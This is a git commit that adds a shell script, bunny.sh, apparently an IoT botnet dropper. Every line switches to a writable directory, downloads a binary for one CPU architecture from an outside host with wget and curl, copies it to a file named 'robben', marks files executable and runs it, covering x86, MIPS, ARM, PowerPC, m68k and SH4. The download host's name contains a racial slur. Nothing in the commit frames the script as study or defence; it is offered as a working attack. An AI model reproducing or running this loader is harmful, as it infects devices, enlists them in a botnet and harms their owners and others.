13f7929841f5226b2f9eb17d6ab171dace7af75a
hackerman441587489 <105286130+hackerman441587489@users.noreply.github.com>
2022-05-10 06:11:53 -0500

    Add files via upload

---
+++ bunny.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://niggaloader.com/bins/bunny.x86; curl -O http://niggaloader.com/bins/bunny.x86;cat bunny.x86 >robben;chmod +x *;./robben Bunnys
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://niggaloader.com/bins/bunny.mips; curl -O http://niggaloader.com/bins/bunny.mips;cat bunny.mips >robben;chmod +x *;./robben Bunnys
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://niggaloader.com/bins/bunny.mpsl; curl -O http://niggaloader.com/bins/bunny.mpsl;cat bunny.mpsl >robben;chmod +x *;./robben Bunnys
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://niggaloader.com/bins/bunny.arm4; curl -O http://niggaloader.com/bins/bunny.arm4;cat bunny.arm4 >robben;chmod +x *;./robben Bunnys
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://niggaloader.com/bins/bunny.arm5; curl -O http://niggaloader.com/bins/bunny.arm5;cat bunny.arm5 >robben;chmod +x *;./robben Bunnys
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://niggaloader.com/bins/bunny.arm6; curl -O http://niggaloader.com/bins/bunny.arm6;cat bunny.arm6 >robben;chmod +x *;./robben Bunnys
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://niggaloader.com/bins/bunny.arm7; curl -O http://niggaloader.com/bins/bunny.arm7;cat bunny.arm7 >robben;chmod +x *;./robben Bunnys
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://niggaloader.com/bins/bunny.ppc; curl -O http://niggaloader.com/bins/bunny.ppc;cat bunny.ppc >robben;chmod +x *;./robben Bunnys
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://niggaloader.com/bins/bunny.m68k; curl -O http://niggaloader.com/bins/bunny.m68k;cat bunny.m68k >robben;chmod +x *;./robben Bunnys
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://niggaloader.com/bins/bunny.sh4; curl -O http://niggaloader.com/bins/bunny.sh4;cat bunny.sh4 >robben;chmod +x *;./robben Bunnys
